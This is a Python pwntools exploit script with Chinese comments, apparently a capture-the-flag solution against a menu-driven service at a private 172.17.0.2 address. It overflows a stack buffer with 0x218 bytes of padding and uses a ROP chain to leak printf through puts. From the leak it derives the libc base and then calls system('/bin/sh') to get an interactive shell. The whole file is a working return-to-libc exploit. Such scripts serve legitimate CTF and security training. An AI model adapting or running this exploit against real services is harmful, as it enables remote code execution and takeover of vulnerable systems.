#!/usr/bin/python
#coding:utf-8

from pwn import *

puts_plt = 0x4007f0
main = 0x401365
printf_got = 0x6027B8
pop_rdi = 0x401483


e = ELF("./libc.so.6_x64")

io = remote("172.17.0.2", 10001)

io.sendlineafter("> ", "1")				#注册和登录账户以解锁功能3和4，触发栈溢出

io.sendlineafter("Name: ", "1")
io.sendlineafter("Password: ", "1")

io.sendlineafter("> ", "2")
io.sendlineafter("Name: ", "1")
io.sendlineafter("Password: ", "1")

io.recvuntil("> ")

payload = ""
payload += "A"*0x218					#padding
payload += p64(pop_rdi)					#pop rdi; ret 为put()设置参数，泄露printf的内存地址
payload += p64(printf_got)				#printf的内存地址，作为参数传递给puts()
payload += p64(puts_plt)				#调用函数puts()
payload += p64(main)					#puts()返回到main函数

io.sendline("3")
io.sendlineafter("to pack? ", payload)	#输入payload以泄露printf函数的内存地址

io.sendlineafter("> ", "4")				#调用功能4将payload复制到栈上，造成栈溢出

io.recvline()
printf_leak = u64(io.recv(6).ljust(8, "\x00"))	#处理泄露出的地址

libc_base = printf_leak - e.symbols["printf"]	#计算libc在内存中的首地址
system = libc_base + e.symbols["system"]		#计算system函数在内存中的地址
bin_sh = libc_base + next(e.search("/bin/sh"))	#计算"/bin/sh"字符串在内存中的地址

payload = ""
payload += "A"*0x218					#padding
payload += p64(pop_rdi)					#pop rdi; ret 为system()设置参数，调用system("/bin/sh")
payload += p64(bin_sh)					#"/bin/sh"字符串所在的内存地址
payload += p64(system)					#调用函数system()
payload += p64(0)						#system()结束后返回的地址，随便填

io.sendline("3")
io.sendlineafter("to pack? ", payload)

io.sendlineafter("> ", "4")				#调用功能4将payload复制到栈上，造成栈溢出

io.interactive()
